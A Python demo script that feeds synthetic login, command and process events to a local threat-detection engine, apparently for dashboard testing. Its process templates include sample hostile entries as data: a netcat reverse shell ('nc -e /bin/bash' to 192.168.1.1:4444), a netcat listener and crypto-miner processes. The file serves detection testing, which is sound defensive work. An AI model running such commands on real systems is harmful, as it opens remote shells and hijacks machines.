#!/usr/bin/env python3
"""
Demo agents that continuously send activity events to the Detection Engine.
Run with: python scripts/demo_agents.py
Requires: ENGINE_URL (default http://localhost:8000), optional ENGINE_API_KEY.
Dashboard will update automatically if it is configured to poll (e.g. every 5s).
"""
import os
import random
import sys
import time
from datetime import datetime, timezone
from hashlib import sha256

# Add project root for optional engine schema usage
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    import requests
except ImportError:
    print("Install requests: pip install requests")
    sys.exit(1)

ENGINE_URL = os.environ.get("ENGINE_URL", "http://localhost:8000")
API_KEY = os.environ.get("ENGINE_API_KEY", "")
EVENTS_ENDPOINT = f"{ENGINE_URL.rstrip('/')}/api/v1/events"
ADMIN_THREAT_ENDPOINT = f"{ENGINE_URL.rstrip('/')}/api/v1/admin/threat-hashes"
INTERVAL_MIN = 2
INTERVAL_MAX = 6
BATCH_SIZE_MIN = 1
BATCH_SIZE_MAX = 4

# Threat hashes that trigger PSI alerts (same as seed_events.sh)
THREAT_HASH_1 = "7a1b2c3d4e5f6078901234567890abcdef1234567890abcdef1234567890abcd"
THREAT_HASH_2 = "b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef1234567890"

DEMO_AGENTS = [
    {"machine_id": "demo-laptop-01", "users": ["alice", "bob", "ops"]},
    {"machine_id": "demo-server-02", "users": ["deploy", "root", "monitor"]},
    {"machine_id": "demo-workstation-03", "users": ["jordan", "marcus", "dev"]},
]

AUTH_TEMPLATES = [
    {"action": "login", "service": "sshd", "success": True},
    {"action": "login", "service": "sshd", "success": True},
    {"action": "login", "service": "sudo", "success": True},
    {"action": "failure", "service": "sshd", "success": False},
    {"action": "failure", "service": "sshd", "success": False},
]

COMMAND_TEMPLATES = [
    {"command_hash": None, "command_length": 10},   # filled with random hash
    {"command_hash": None, "command_length": 45},
    {"command_hash": None, "command_length": 120},
    {"command_hash": THREAT_HASH_1, "command_length": 8},   # known malicious
    {"command_hash": THREAT_HASH_2, "command_length": 12},
]

PROCESS_TEMPLATES = [
    {"pid": 1000, "exe": "/usr/bin/bash", "argv": ["bash"], "parent_pid": 1, "start_time": None},
    {"pid": 1001, "exe": "/usr/bin/python3", "argv": ["python3", "-m", "agent.main"], "parent_pid": 1000, "start_time": None},
    {"pid": 1002, "exe": "/usr/bin/git", "argv": ["git", "pull"], "parent_pid": 1000, "start_time": None},
    {"pid": 2001, "exe": "/usr/bin/nc", "argv": ["nc", "-l", "-p", "4444"], "parent_pid": 1000, "start_time": None},
    {"pid": 2002, "exe": "/tmp/crypto_miner.sh", "argv": ["/tmp/crypto_miner.sh"], "parent_pid": 1001, "start_time": None},
    {"pid": 2003, "exe": "/usr/bin/nc", "argv": ["nc", "-e", "/bin/bash", "192.168.1.1", "4444"], "parent_pid": 1000, "start_time": None},
    {"pid": 2004, "exe": "/var/tmp/xmrig", "argv": ["/var/tmp/xmrig", "-o", "pool.example.com"], "parent_pid": 1000, "start_time": None},
]


def random_hex_hash(prefix: str = "") -> str:
    h = sha256(f"{prefix}{random.random()}{time.time()}".encode()).hexdigest()
    return h


def ensure_threat_hashes() -> None:
    headers = {"Content-Type": "application/json"}
    if API_KEY:
        headers["Authorization"] = f"Bearer {API_KEY}"
    for ch, cat in [(THREAT_HASH_1, "destructive"), (THREAT_HASH_2, "reverse_shell")]:
        try:
            requests.post(
                ADMIN_THREAT_ENDPOINT,
                json={"command_hash": ch, "category": cat},
                headers=headers,
                timeout=5,
            )
        except Exception:
            pass


def build_event(machine_id: str, user: str, source: str, payload: dict) -> dict:
    now = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
    return {
        "event_type": source,
        "machine_id": machine_id,
        "user": user,
        "timestamp": now,
        "source": source,
        "payload": payload,
    }


def generate_batch() -> list[dict]:
    events = []
    for agent in DEMO_AGENTS:
        machine_id = agent["machine_id"]
        user = random.choice(agent["users"])
        n = random.randint(BATCH_SIZE_MIN, BATCH_SIZE_MAX)
        for _ in range(n):
            kind = random.choice(["auth", "command", "process"])
            if kind == "auth":
                pl = dict(random.choice(AUTH_TEMPLATES))
            elif kind == "command":
                t = random.choice(COMMAND_TEMPLATES)
                pl = {
                    "command_hash": t["command_hash"] or random_hex_hash()[:64],
                    "command_length": t["command_length"],
                }
            else:
                t = dict(random.choice(PROCESS_TEMPLATES))
                t["start_time"] = time.time() - random.randint(0, 3600)
                pl = t
            events.append(build_event(machine_id, user, kind, pl))
    return events


def send_batch(events: list[dict]) -> bool:
    headers = {"Content-Type": "application/json"}
    if API_KEY:
        headers["Authorization"] = f"Bearer {API_KEY}"
    try:
        r = requests.post(EVENTS_ENDPOINT, json=events, headers=headers, timeout=10)
        if r.ok:
            return True
        print(f"Engine returned {r.status_code}: {r.text[:200]}", file=sys.stderr)
    except requests.RequestException as e:
        print(f"Request failed: {e}", file=sys.stderr)
    return False


def main() -> None:
    print(f"Demo agents → {EVENTS_ENDPOINT}")
    print("Agents:", [a["machine_id"] for a in DEMO_AGENTS])
    print("Press Ctrl+C to stop.\n")
    ensure_threat_hashes()
    sent = 0
    while True:
        batch = generate_batch()
        if send_batch(batch):
            sent += len(batch)
            print(f"Sent {len(batch)} events (total {sent})")
        delay = random.uniform(INTERVAL_MIN, INTERVAL_MAX)
        time.sleep(delay)


if __name__ == "__main__":
    main()
